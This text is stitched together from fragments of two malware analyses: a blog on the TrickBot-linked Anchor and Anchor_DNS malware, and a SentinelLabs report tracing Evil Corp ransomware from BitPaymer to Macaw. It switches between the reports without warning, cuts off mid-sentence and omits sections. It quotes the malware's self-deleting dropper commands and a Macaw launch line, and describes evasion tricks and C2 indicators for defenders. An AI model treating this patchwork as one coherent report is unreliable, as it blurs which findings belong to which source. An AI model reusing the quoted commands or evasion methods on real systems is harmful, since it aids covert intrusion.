\n\nAn-\nchor_x86\n\nBd26238fb7d7e16ea79073d882bba00d34dd859c\n\nF3683a0c12154e8bf44d9d942db3eac9e930e7a5\n\n9ebb541dcb24d564448a6f5e00c613b73eba7148\n\nD:\\MyProjects\\secondWork\\Anchor\\Win32\\Release\\Anchor_x86.pdb\n\nC:\\Users\\ProFi\\Desktop\\data\\Win32\\anchorInstaller_x86Code\\Anchor_x86.pdb\n\nD:\\Anchor\\Anchor\\Win32\\Release\\Anchor_x86.pdb\n\nAn-\nchor_x64\n\n46c595e580719a4c54f55b4041f81d6e50ab4062\n\ne5dc7c8bfa285b61dda1618f0ade9c256be75d1a\n\nD:\\Anchor\\x64\\Debug\\Anchor_x64.pdb\n\nC:\\[JOB]\\Anchor\\x64\\Release\\Anchor_x64.pdb\n\nThe Anchor payload is delivered by AnchorInstaller AnchorInstaller unpacks the Anchor DLL and drops it in the %SYSTEMROOT% or\n%SYSTEMROOT%\\System32 folder. The dropped DLL is loaded by the service netTcpSvc, which is created by the malware.\n\nAnchor service persistence found in the registry.\n\nNTFS ADS File - Storing the GUID\n\nSimilar to Anchor_DNS, Anchor creates an NTFS ADS file $GUID to store its GUID:\n\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 18/23\n\nAnchor GUID stored as an NTFS ADS.\n\nUnlike Anchor_DNS, which stores the information in Base64, Anchor’s GUID is saved in cleartext.\n\nSelf Deletion\n\nAnchor and older versions of Anchor_DNS implement the exact same self deletion routine using two sets of commands to ensure that the\ndropper is deleted once the malware was successfully deployed:\n\ncmd.exe /c timeout 1 && del C:\\Users\\[USER]\\[SAMPLE_LOCATION]\"\ncmd.exe /C PowerShell 'Start-Sleep 5; Remove-Item C:\\Users\\[USER]\\[SAMPLE_LOCATION]'\n\nC2 Communication\n\nSimilar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2\nservers. It uses the following hardcoded web services to test connectivity:\n\nOnce it has established connectivity, it communicates with a set of hardcoded C2 servers.\n\nCommunication with a set of hardcoded C2 servers.\n\nThe request and response follow the same C2 communication format as TrickBot.\n\nThe request and response format for Anchor.\n\nhttp://malware-traffic-analysis.net/2019/10/02/index.html\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 19/23\n\nConnecting Anchor / Anchor_DNS to TrickBot\n\nAnchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads. There are\nalso several other similarities noted below.\n\nGUID Generation Function\n\nThe GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot. The GUID\nfollows this pattern:\n\n[Machine_NAME]_[Windows_Version].[Client_ID]\n\nMalware Name GUID\n\nAnchor_DNS /anchor_dns/MACHINE-001_W617601.D4CB942AA18EFF519DCBCAE88A0A99FB/\n\nAnchor /anchor001/jujubox-PC_W617601.6E8516CA48318FB2904E2027B5350B26\n\nTrickbot /mor49/DAVID-PC_W10017134.55C60B5D13499341D72F5A34C632CFD9\n\nExternal IP Check Web Services\n\nBoth Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the\nexternal IP of the infected machine. The same list is also used by TrickBot:\n\ncheckip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, and ip.anysrc.net.\n\nIn certain cases, if internet connectivity cannot be reached, Anchor and older versions of Anchor_DNS will delete themselves.\n\nShared C2 Infrastructure\n\nTrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure. However, in some instances of this attack, there was C2 server\noverlap between these infrastructures. For example, the IP 23.95.97[.]59, which is hardcoded in an Anchor sample, has also served Anchor_DNS\nand TrickBot:\n\nAnchor sample with hardcoded IP (SHA-1: 9ebb541dcb24d564448a6f5e00c613b73eba7148)\n\nConnection to TrickBot\n\nThis above IP address was used by TrickBot to download the squlDLL plugin, which includes email harvesting from SQL servers, screenlocker,\nand Mimikatz.\n\nConnection to Anchor_DNS\n\nThe same IP resolved to a domain previously used by Anchor_DNS, chishir[.]com.\n\nPassive DNS information of 23.95.97[.]59 , taken from VirusTotal.\n\nComparison Between Anchor Malware Family\n\nhttps://www.fortinet.com/blog/threat-research/new-trickbot-plugin-harvests-email-addresses-from-sql-servers-screenlocker-module-not-for-ransom.html\nhttps://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns\nhttps://www.virustotal.com/gui/ip-address/23.95.97.59/relations\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 20/23\n\nThe following table gives a comparison between different malware in the Anchor malware family.\n\nFeatures Anchor Old Anchor_DNS New Anchor_DNS\n\nEarliest Observed Sample August 2018 May 2019 November 2019\n\nCommand-line arguments? - + +\n\nSelf-Deletion + + -\n\nNetwork Connectivity check via ICMP - - +\n\nNetwork Connectivity check via web services + + -\n\nNTFS ADS files + + +\n\nTrickBot’s GUID Generation pattern +\n\n(Cleartext)\n\n+\n\n(base64)\n\n+\n\n(base64)\n\nCode Obfuscation Very Little Very Little Obfuscated Code\n\nC2 Communication Protocols HTTP(S) DNS ICMP, DNS\n\nRise of Signed Malware\n\nCode signing is meant to provide a level of credibility and integrity to a binary from the developer, and to guarantee that the binary has not been\ntampered with. In the past, signing malware was a practice mostly seen with nation-state threat actors. However, this is no longer the case.\nNowadays, more and more commodity malware are being signed with valid certificates, effectively bypassing some security solutions that grant\ntrust to signed binaries.\n\nMalicious files in this attack were signed by:\n\nBiller FIN Oy\nNIRMAL 0013 Limited\nBRO-BURGER, LLC\n\nTrickBot payloads and Anchor / Anchor_DNS payloads were at times signed by the same signer, which further demonstrate that these malware\nare most likely used by the same threat actor.\n\nIn searching for additional signed known and unknown files, we were able to identify dozens of malware samples signed by the same\norganizations. Some were also signed with the same serial number.\n\n1.

These attacks start with a TrickBot infection and, with high-profile targets, can escalate to a hacking operation leveraging a\nnew malware, Anchor, and a new variant of Anchor_DNS.\n\nUnlike previously reported TrickBot attacks that resulted in mass ransomware infections, these new attacks focus on stealing sensitive\ninformation from POS systems and other sensitive resources in the victims’ network by compromising critical assets.\n\nIn addition, Cybereason discovered a previously undocumented malware called Anchor as well as a new variant of the recently discovered\nAnchor_DNS malware. Both Anchor and Anchor_DNS are directly related to TrickBot infections and have code similarities, and sometimes also\nshare C2 infrastructure with TrickBot. Anchor_DNS uses various techniques to keep itself under-the-radar, such as communication over DNS,\nand the reliance on specific command-line arguments in order to run properly. Through these techniques, it is able to evade many security\nproducts including certain sandboxes and AV vendors.\n\nThese attacks stress the danger of commodity malware infections that sometimes may be underestimated due to their frequent use and high\nvolume. It is important to note that, in this attack, once an endpoint is infected with TrickBot it is up to the attackers to decide their next move. If\nthey identify a high-value target, they can go beyond the traditional information stealing capabilities of TrickBot and use the target machine as\nan entry point to other machines on the network.\n\nThis research does not focus on the attribution of these attacks. However, through analysis of the evidence and context presented in our\nresearch, we noticed certain TTP overlaps  with earlier attacks that were attributed  to the financially-motivated FIN6 threat actor. We leave it to\nour readers to draw their own conclusions on the attribution of these attacks.\n\nLastly, these attacks show how threat actors are shifting toward signed malware more than ever before. As this trend continues to evolve,\nsecurity practitioners and security vendors must improve the detection of signed malware and re-think the trust given to signed binaries in\ngeneral.\n\nThe best way to defend against an attack like this is to use an iterative security process.

There are strong overlaps in terms of code \nsimilarities, packers, TTPs and configurations.\n\n•\t SentinelLabs assesses with high confidence that the Macaw ransomware variant is derived \nfrom the same codebase as Hades.\n\n•\t A portion of SocGholish infrastructure, controlled by EC, and used to deliver WastedLocker \nand Hades Ransomware, was also used to spread BitPaymer and DoppelPaymer by \ndeploying Dridex1 loader. \n\n•\t Since late 2019, Evil Corp has been evolving their tradecraft in order to continue to pivot \naround OFAC sanctions.\n\n•\t CryptOne: throughout our analysis we noticed the unique use of a crypter tool dubbed \n“CryptOne”. We were able to identify and map all of the CryptOne ‘flavours’ used in \ndifferent time-frames. This supported our clustering of EC activity, through the correlation \nof those signatures.\n\nThis report summarizes an in-depth analysis of Evil Corp (“EC”, a.k.a “Gold Drake”, a.k.a \n“Indrik Spider”), an advanced cybercrime activity cluster originating from Russia, performed by \nSentinelLabs. As a result of this research and previous intelligence, we were able to cluster a \nrange of EC’s malware lineage and their activities. This investigation raises new insights about the \ngroup’s modus operandi and toolsets.\n\nPlease note: While EC is a name of a cyber crime gang, run by several known individual members, \nthis report refers to the activity as it is seen through TTPs. We believe that this approach is more \naccurate to describe and track their operations. A list of IOC’s and YARA rules can be found at \nthe end of this report.\n\n1https://www.fireeye.com/blog/threat-research/2019/10/head-fake-tackling-disruptive-ransomware-attacks.html\n\n\n\n4SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nBACKGROUND\n\nEvil Corp (“EC”, a.k.a “Gold Drake”, a.k.a “Indrik Spider”), is an advanced cybercrime operations \ncluster originating from Russia and has been active since 2007. The UK National Crime Agency \ncalls it “the world’s most harmful cyber crime group.”2\n\nThe origins of Evil Corp can be traced back to Evgeniy Bogachev, one of the leading figures of the \ngroup. Evgeniy Bogachev (also known as Slavik) developed the Zeus banking trojan3. Bogachev \nconsidered to be the leader of the “Business Club”, a group of half-dozen people supported by a \nnetwork of more than 50 individuals tied with the Russian Government. An award of 3 million dollars \nwas announced for information that would lead to his capture. In 2011, the Zeus source code was \nleaked and different versions appeared in the wild. In September 2011, a new Zeus variant named \nGameover Zeus (also known as Zeus Game Over, GoZ) was identified. It added a peer-to-peer C2 \narchitecture that was more resilient to takedown, with the intention to mislead law enforcement. \nBy mid 2014, GoZ counted over 27 different botnets, one million compromised computers and \nwas responsible for the theft of tens of millions of dollars. Slavik was the administrator of the GoZ \nBotnet, and had the support of the Business Club crew. This support from the Business Club crew \nintroduced Slavik to Maksim Yakubets. This partnership would come to form the backbone of what \nis now EC.\n\nMaksim Yakubets (aka “aqua”) is believed to have acted as Evil Corp group’s leader (the last \nofficial document which describe him as a leader is from 5 Dec 20194). The group was one of \nthe pioneers of financial cybercrime, having operated one of the most aggressive and successful \nBanking trojans since 2014, Dridex. Evil Corp has earned millions of dollars in illicit profit from \nbanks and financial institutions in over 40 countries.\n\nIn August 2017, EC’s began to focus on more high-return targets with BitPaymer Ransomware, \ndelivering the ransomware with Dridex mainly against North American and Western European \norganizations. In June 2019, the cluster DoppelSpider5, considered a distinct group6 (or a sub-\ncluster of EC), started operating a new ransomware dubbed DoppelPaymer. It was a new strain \nderived from BitPaymer’s codebase and operated as a RaaS. It presented an important similarity \nwith its predecessor but also implemented new features like multithreaded file encryption. \nDoppelPaymer was operated in parallel with BitPaymer; supporting the assessment that it was a \ndistinct cluster.\n\n2https://twitter.com/NCA_UK/status/1202618928209498114?s=20\n3https://www.fbi.gov/wanted/cyber/evgeniy-mikhailovich-bogachev\n4https://home.treasury.gov/news/press-releases/sm845\n5https://adversary.crowdstrike.com/en-US/adversary/doppel-spider/\n6https://www.crowdstrike.com/blog/doppelpaymer-ransomware-and-dridex-2/\n\nhttps://www.sentinelone.com/blog/control-panel-in-new-zeus-variant-reveals-sophistication-of-crime-rings/\n\n\n5SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nOFAC SANCTIONS AND INDICTMENTS: A CHANGE IN TTPS\nIn December 2019, the U.S. Treasury Department’s Office of Foreign Assets Control (OFAC)7 issued \na sanction against 17 individuals and seven entities related to EC cyber operations for causing \nfinancial losses of more than 100 million dollars with Dridex. In addition to the OFAC sanction, the \nDOJ charged two key members of the group: Maksim Yakubets and Igor Turashe; both members \nof the “Business Club” and considered the developers of the Dridex banking trojan. Yakubets was \nalso mentioned as the leader of the group. In May 2020, following the OFAC which put Dridex under \nthe scope of the sanction, a new ransomware variant appeared in the wild dubbed WastedLocker. \nIt employs techniques to obfuscate its code and perform tasks similar to those already seen in \nBitPaymer and Dridex. Those similarities allowed the threat intelligence community to identify the \nconnections between the malware families8.\n\nRight after the indictment we witnessed a change in some of their TTPs: from 2020, they started \nto frequently change their payload signatures, using different exploitation tools and methods of \ninitial access. They switched from Dridex to the SocGholish framework to confuse attribution and \ndistance themselves from both Dridex and Bitpaymer, which fell within the scope of the sanctions. \nDuring this period they started using Cobalt Strike extensively to gain an initial foothold and \nperform lateral movement instead of PowerShell Empire. \n\nAt this point, after the indictments, the global intelligence community was split into different \n“camps’’ as to how EC was operating. Some assessed that there was a voluntary transition of \nEC operations to another ‘trusted’ partner while remaining the controller of operations. Some \nhad theories that they stopped operating and another advanced actor operated Hades trying to \nmimic the same MO as EC to mislead attribution. Some claim9 possible attribution to the HAFNIUM \nactivity cluster. This report argues that the original operators continue to be active despite the \nsanctions, continuously changing their TTPs in order to stay under the radar.\n\nIn December 2020, a new ransomware variant named Hades was first seen in the wild and publicly \nreported10. Hades is a 64-bit compiled version of WastedLocker that displays important code and \nfunctionality overlaps11. In March 2021, a new variant Phoenix Locker appeared in the wild, which \nseemed to be a rebranded version of Hades with little to no changes12. Later, a new variant named \nPayloadBIN appeared in the wild13, a continuation from Phoenix Locker. Another distinctive MO \nworth mentioning which characterizes all their ransomware operations is related to the extortion \nphase. Security researchers from several private sector firms note that historically there was no \nevidence of data theft during BitPaymer and WastedLocker incidents14. In addition to this, they \ndidn’t operate any data leak site.\n\n1 https://attack.mitre.org/software/S0073//\n\n7https://home.treasury.gov/news/press-releases/sm845\n8https://news.sophos.com/en-us/2020/08/04/wastedlocker-techniques-point-to-a-familiar-heritage/\n9https://awakesecurity.com/blog/incident-response-hades-ransomware-gang-or-hafnium/\n10https://twitter.com/demonslay335/status/1339324224029274118?s=20\n11https://www.crowdstrike.com/blog/hades-ransomware-successor-to-indrik-spiders-wastedlocker/\n12section Hades vs. Phoenix Locker: A polymorphic code of this report\n13https://twitter.com/fwosar/status/1401110845820747797?s=20\n\n\n\n6SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nTHE EVIL CORP MALWARE LINEAGE\n\nEVIL CORP AFFILIATION MODEL\nDridex first appeared on the scene in June 2014. It was derived from Bugat V5. EC operates \nDridex with an affiliation model, where each affiliate maintains control of a subset of bots while \nEC controls all the C2 backends. \n\nDridex has also been delivered by Emotet since 201715. This suggests that there is a functional \nrelationship between the two groups (they share resources). Moreover, research by Trend Micro \nhighlighted that Emotet, Gozi IFSB and Dridex share the same loader16. Following the distribution \nof Dridex v4 binaries (botnet IDs 199 and 501) a new update in the TTPs has been observed, \nin fact they began using Dridex to execute PowerShell Empire and the Koadic post-exploitation \nframework17. \n\nDridex was also the primary delivery method for BitPaymer Ransomware. Following the OFAC \nsanctions, in March 2020, WastedLocker was delivered exclusively through SocGholish. Ever since, \nSocGholish has been associated with the delivery of other malware that SentinelLabs attributes to \nEC activity, suggesting that SocGholish is a solid indicator of EC’s recent activity.\n\nIn the following diagram we draw connections or affiliations between Evil Corp and other actors. \nThe dark blue rectangles represent threat actors, the orange are related to malware families and \nloaders while the red ones are related to ransomware.

To cluster activities with confidence, it is important to find strong and \nnon ambiguous relationships and assess them in order to understand their nature, the role of \neach actor and the modus operandi. In this section we provide evidence of code overlaps, shared \nconfigurations, packers used and TTPs supporting the assessment that Bitpaymer, WastedLocker, \nHades, PhoenixLocker and PayloadBIN share a simila codebase. \n\nWe decided to reassess the relationship between ransomware variants which have been analyzed \nbefore and attributed to EC. This analysis provides the foundation on which we examine further \nchanges and evolutions. We compared each variant with its ancestor in a chronological order.\n\n\n\n8SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nBITPAYMER VS.

We assess it is \nalmost certain that they come from the same ‘factory’ (the same developer or group of developers). \nThere are important overlaps between the two families, which are summarized below. For our \nsimilarity analysis we considered the following samples from both families:\n\nFILE AND DIRECTORY ENUMERATION ROUTINE\nBoth samples implement file and directory enumeration logic identically. Comparing the logic and \nthe Control Flow Graph of both routines, we concluded both ransomware use the same code for \nfile and directory enumeration.\n\nThe routines under scope are:\n\nWastedLocker .text:00402F88 f_enumerate_files\n\nHades .obX0:00000001401B6AA9 f_enumerate_files\n\nFamily Sha256 Packed Sha256 unpacked Compilation \ntimestamp\n\nSubmission  \nto VT\n\nWastedLocker\n\n905ea119ad8d3e54 \ncd228c458a1b5681 \nabc1f35df782977a \n23812ec4efa0288a\n\n965a7ae835ea9c53 \nc9617fc337317c79 \n9222094846d6a2b7 \n761dfae1f594aec3\n\n2020-07-22 2020-07-23\n\nHades\n\nfe997a590a68d98f \n95ac0b6c994ba69c \n3b2ece9841277b7 \nfecd9dfaa6f589a87\n\n4bb5636c13adf39d \n07f6d09506065b4 \na727b6c3c348967a \nbe3f122b217be8e9a\n\n2020-12-20 2021-01-07 \n\n\n\n1 0SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nOn the left side we have WastedLocker, while on the right side, Hades. Side-by-side, we noticed \nthe same structure between the above functions, and the same information was used to keep files \nfor encryption. Moreover, the same approach was used to allocate a memory heap (heapAlloc) \nthen zeroing the allocated memory with memset. The only difference in heap allocation is that \nHades groups the heapAlloc and the memset into one single function (f_call_HeapAlloc_and_\nzero_memory). Furthermore, the Control Flow Graphs of the two functions are almost identical:\n\nFig 3: WastedLocker(left), Hades(right). “Similarity of file and dir enumeration routine function”.\n\nFig 4: WastedLocker(left), Hades(right). “CFG similarity of file and dir enumeration routine”.\n\n\n\n1 1SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nDRIVES ENUMERATION ROUTINE:\nWe found similarities between the functions responsible for drive enumeration. In the figures \nbelow, the two functions present nearly identical structures, and rely on the same Win32API for \ncritical sections management:\n\nFig 5: WastedLocker(left), Hades(right). “Drive enumeration routine similarities”.\n\n\n\n1 2SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nRSA ENCRYPTION ROUTINE\nDuring our investigation, we observed that the RSA functions - responsible for asymmetrically \nencrypting the keys which were used in the AES phase to encrypt files - are identical in both \nransomware, hinting that the same utility library was used.\n\nBoth Ransomware rely on the RSAREF22 crypto lib to implement the RSA algorithm and crypto utils  \n(i.e md5sum). The RSAREF is not maintained anymore (last activity dates back about 5 years ago, at \nthe time of writing). This is a peculiar element because, to the best of our knowledge, no other known \nransomware families use this specific implementation. Further, the way the two implementations \nlook - their structure, the same RSA implementation, the same API pattern - led us to think that they \nare both developed by the same hand or relying on the same functions/code reuse.\n\nFig 6:WastedLocker(left), Hades(right). “same RSA implementation”.\n\n22https://sourceforge.net/projects/rsaref/\n\n\n\n1 3SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nWhilst WastedLocker and Hades have striking similarities in file and directory enumeration, drive \nenumeration and RSA encryption, we also note some differences between the ransomwares. The \nmain differences between WastedLocker and Hades are summarized below:\n\n•\t WastedLocker is a 32-bit PE while Hades is a 64-bit PE.\n•\t Most of the file-related APIs for file management which were used in WastedLocker are \n\nreplaced by their lower-level ones. Some examples include:\n•\t FindFirstFileW + FindNextFileW -> ZwCreateFile + ZwQueryDirectoryFile\n•\t CreateFileW + WriteFileW + CloseHandle -> ZwCreateFile + ZwWriteFile + ZwClose\n•\t MoveFileW -> ZwCreateFile + ZwSetInformationFile(..., FileRenameInformation)\n•\t DeleteFileW -> ZwCreateFile + ZwSetInformationFile(..., FileDispositionInformation)\n\n•\t While WastedLocker assembly code was left mostly unchanged, Hades assembly code \nwas modified heavily to hinder static analysis, similarity tools or emulation. Some \nmodifications include:\n\n•\t Insertion of a wide range of no-op-codes, which modify the states of unused registers, \ntherefore not changing the outcome of functions.\n\n•\t A small subset of APIs are imported dynamically at runtime, like: CryptAcquireContextW, \nCryptGenRandom and CryptReleaseContext.\n\n•\t In their prolog, a few functions contain a call to subroutines which include somewhat \nmore esoteric op-codes and indirect calls.\n\nFig 7:WastedLocker(left) uses API from RSAREF crypto lib(right)\n\n\n\n1 4SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nThe changes between WastedLocker and Hades served primarily to change the detection signature \nof the malware and make it more evasive. The similarities in implementation and code overlap \nhowever, suggest Hades is highly likely an evolution of WastedLocker.\n\nHADES VS. PHOENIX LOCKER: A POLYMORPHIC CODE\nFor this analysis, we investigated the following samples:\n\nBoth payloads have the same compilation timestamp (orange column in the table below). This \nsuggested that the same ransomware payload (Hades in this case) was reused, but packed in two \ndifferent moments in time. The compiler and linker versions are also the same. This technique of \npayload reuse was also seen in BitPaymer23. Moreover they have a different “business” infrastructure: \ndifferent wallets, communication with the victim.\n\nFig 8: WastedLocker(left), Hades(right). “A small subset \nof APIs are imported dynamically at runtime”.\n\nFamily Sha256 Packed Sha256 unpacked Compilation \ntimestamp\n\nSubmission  \nto VT\n\nHades\n\ne657ff4838e47465 \n3b55367aa9d4a06 \n41b35378e2e379ad \n0fdd1631b3b763ef0\n\nd62425b0bb7e2be \nb2a96839c1231457 \n08644e4cc9a599b87 \n11cbe1a5472527ea\n\n2021-03-06 2021-03-26\n\nPhoenixLocker\n\n008ec7976532520 \n0361d9c93ac35edd \n430f8b17894ff8432 \n68caa5acd6224549\n\n79d7706aff1e6f008 \ndc25b4b7e1dd2bd2 \nf9acd7cf6dfd89c96 \n470203a684643a\n\n2021-03-20 2021-03-26\n\n23https://blog.morphisec.com/bitpaymer-ransomware-with-new-custom-packer-framework\n\n\n\n1 5SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nSample Sha1\nCompilation  \ntimestamp  \n(packed)24\n\nCompilation  \ntimestamp  \n\n(unpacked)25\nCompiler/Linker CryptOne  \n\nVersion\n\nHades\n\nb4061d4227 \ne08cfaa3190 \ndea9926571 \nfca2736a1\n\nunpacked:  \nf58c980816 \nef122973db \nbba2c66f8c \n6850f45764\n\n2021-03-06  \n18:13:45\n\n2020-12-14 \n09:34:38\n\nCompiler: \nMicrosoft Visual \nC/C++(2008)[-]\n\nLinker: Microsoft \nLinker(9.0)\n[EXE64,signed]\n\n111111111\\ \n{aa5b6a80- \nb834-11d0- \n932f-00a0 \nc90dcaa9}\n\nPhoenixLocker\n\n3cb0cb07cc \n2542f1d980 \n60adccda72 \n6ea865db98\n\nUnpacked: \n53185223c0 \n36f010faa1e \n077b4eaa59 \n7392ca76c\n\n2021-03-20 \n20:00:50\n\n2020-12-14 \n09:34:38\n\nCompiler: \nMicrosoft Visual \nC/C++(2008)[-]\n\nLinker: Microsoft \nLinker(9.0)\n[EXE64,signed]\n\n111111111\\ \n{aa5b6a80- \nb834-11d0- \n932f-00a0 \nc90dcaa9}\n\nThe interesting observation is that the payload was compiled at the same time but presents a different \nhash.

The \nsimilarity score between the two samples was slightly higher, with a value of 0.50. Taking a \ncloser look, we observed that the majority of the PayloadBIN functions overlap with its ancestor \nPhoenixLocker. There was a partial rewrite of the ransomware code however, justified by the \ncompilation timestamps of the unpacked payload, which is Wed Apr 28 11:04:49 2021 for \nPayloadBIN and Mon Dec 14 01:34:38 2020 for Phoenix Locker.

From WastedLocker to Hades, however, the time \nbetween releases is longer, justifying the effort of having to rewrite the code from scratch. From our \nobservation of the timeline, we assess it is highly likely that all the ransomware payloads were \ndeveloped by the same ‘factory’ (developer or group of developers). Moreover, the changes in \nthe code are consistent with the timing between releases.\n\nCONCLUSION\nSentinelLabs assesses that it is highly likely that WastedLocker, Hades, PhoenixLocker and \nPayloadBIN belong to the same cluster. Our assessment is based on code similarity and reuse, \ntimeline consistency and nearly identical TTPs across the ransomware families indicating there is a \nconsistent modus operandi for the cluster. In addition, we assess that there is a likely evolutionary \nlink between WastedLocker and BitPaymer, and suggest that it can be attributed to the same EC \nactivity cluster.\n\nSentinelLabs assesses, with high confidence, Hades, Phoenix Locker and PayloadBIN variants share \nthe same codebase. In addition, we assess it is highly likely that they belong to a common ‘factory’. \n\nWhether Evil Corp outsourced the ransomware development is still an open question. However, \nit appears that they tend to maintain control over the whole ransomware development process in \norder to reduce the time it takes to make their ransomware operationally active. Keeping control of \nthe process allows EC to better manage their operational security during operations. The evidence \nof incremental linking, the polymorphism statically introduced (which requires Hades’ codebase), \nand the usage of the same version of CryptOne, supports the assessment that it is highly likely a \nsingle unique cluster. \n\n\n\n2 7SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nC:\\Users\\Lucas\\Documents\\OneNote Notebooks\\Personal\\General.one.cypherpunk\nC:\\Users\\Lucas\\Documents\\awards.xls.cypherpunk\nC:\\Users\\Lucas\\Desktop\\ZoneMap.dwf.cypherpunk\nC:\\Users\\Lucas\\Documents\\OneNote Notebooks\\Personal\\CONTACT-TO-DECRYPT.txt\nC:\\Users\\Administrator\\Searches\\Everywhere.search-ms.cypherpunk\nC:\\Users\\Lucas\\Desktop\\th (2).jpg.cypherpunk\nC:\\Users\\Lucas\\Documents\\pexels-photo-46710.jpeg.cypherpunk\nC:\\Users\\Lucas\\Desktop\\ppt_ch10.ppt.cypherpunk\nC:\\Users\\Lucas\\Desktop\\WEF_Future_of_Jobs.pdf.cypherpunk\n\nSAK GUARD SOLUTION LTD\nName: SAK GUARD SOLUTION LTD\nStatus: Valid\nIssuer Sectigo RSA Code Signing CA\nValid From: 12:00 AM 02/17/2021\nValid To: 11:59 PM 02/17/2022 \nValid Usage: Code Signing\nAlgorithm: sha256RSA\nThumbprint: FADE3F5FFCA06CCEEF202DDEAE9339EA64D1AD7A\nSerial Number: 3D C6 B2 72 F4 66 B7 29 F8 4A 17 27 82 51 D6 CC\n\nOTHER TOOLSET EXPANSION\n\nTracking the threat actor ’s tools led us to discover another new, possibly experimental, variant \ndubbed “Cypherpunk” - we named it this due to the encryption extension found.\n\nCode similarity analysis shows that the Cypherpunk version is the same as the previous PayloadBIN \nvariant.

A Few days later, Sinclair Broadcast \nGroup systems were also attacked, causing wide disruption29. Some researchers claimed a \npossible relation with WastedLocker30, but at the time of writing, no one provided further \ndetails about this assessment.\n\nThe ransomware presents anti-analysis features like API hashing and indirect API calls with \nthe intention of evading analysis. The only reliable way to reconstruct functions is via dynamic \nanalysis by way of fully executing the sample. One aspect that immediately sets Macaw apart \nis the fact that it requires a custom token (provided from the command line), which seems \nspecific for each victim; without it, it won’t execute (also seen in Egregor and BlackCat): \n\nThis additional requirement also aids in anti-analysis.\n\nAnother new addition to Macaw was a special function that acquires the imports for APIs at \nruntime instead of when the executable is started via the PE import section. Below we can see \nthe function that is used before each API call, to get the address of it just before the call itself. \n\nFig 19: The content of the ransom note used in Macaw\n\nmacaw_sample.exe -k <tokeID>\n\n28https://techcrunch.com/2021/10/12/olympus-confirms-us-cyberattack-weeks-after-blackmatter-ransomware-hit-emea-systems/\n29 https://www.bleepingcomputer.com/news/security/sinclair-tv-stations-crippled-by-weekend-ransomware-attack/\n30https://www.bleepingcomputer.com/news/security/evil-corp-demands-40-million-in-new-macaw-ransomware-attacks/\n\nhttps://www.sentinelone.com/labs/egregor-raas-continues-the-chaos-with-cobalt-strike-and-rclone/\nhttps://www.sentinelone.com/labs/blackcat-ransomware-highly-configurable-rust-driven-raas-on-the-prowl-for-victims/\n\n\n2 9SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nThe function gets a 32-bit value that uniquely represents the required API and searches for it \nthrough a data structure created beforehand. The data structure can be described as an array \nwith small binary search trees in each of its entries. \n\nFig 20: The new function in Macaw which is used to dynamically  \nfetch addresses for the different external API used by it\n\nAt this point we tried to assess the similarity of two core functions (ex: between Hades and \nMacaw). In both strains (Hades / Macaw), the implementation is still the same. The only minor \ndifferences are from the imports fetched at runtime (so in Hades the color is magenta in the \npicture below, because the import is a load time one, specified in the PE import table. and in \nMacaw, the color is not magenta, but it still uses the same API, just retrieved at runtime). \n\nFig 21: One example of indirect calls used in Macaw just to invoke a call to \nRtlAllocateHeap, calculating the destination address in EAX, exchanging the resulting \n\nvalue with the top of the stack and jumping to it using a “ret” instruction\n\n\n\n3 0SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nFig 22: The drive enumeration function in both Hades (left)  \nand Macaw (right) is partially identical\n\nFig 23: Another example from the beginning of the encryption function  \nin both Hades (left) and Macaw (right) doing the same operations\n\n\n\n3 1SANCTIONS BE DAMNED | FROM DRIDEX TO MACAW, THE EVOLUTION OF EVIL CORP\n\nCONCLUSION\nIt emerges from the analysis of the Evil Corp’s TTPs over time that this threat actor put much of \nits effort into defense evasion. Apart from the code overlaps that we found in Macaw, the new \nimplementation fully reflects this MO. The signature is sufficiently different to deflect attribution \nand avoid simple detection efforts. While the indirect API calls and inserted NOP instructions \nare intended to hinder analysis, our investigation reveals that Macaw is derived from the same \ncodebase as Hades and other Evil Corp samples.\n\nWe provided a partial assessment of some functionality of the Macaw variant. We found strong \noverlaps in the file enumeration and in the encryption routine with Hades, also the same usage of \nadding junk code which constitutes a distinctive element. \n\nThis new attempt perfectly fits the observed EC TTPs and is also consistent with the timeline \nconsidering that since PayloadBIN, four months have passed and they had all the time to plan \na new operation and change the obfuscation. This time it seems that they used VMProtect, so \ndespite removing the original signatures (like .vmp0 and .vmp1 PE sections) some features and the \nstyle of code seems related to this 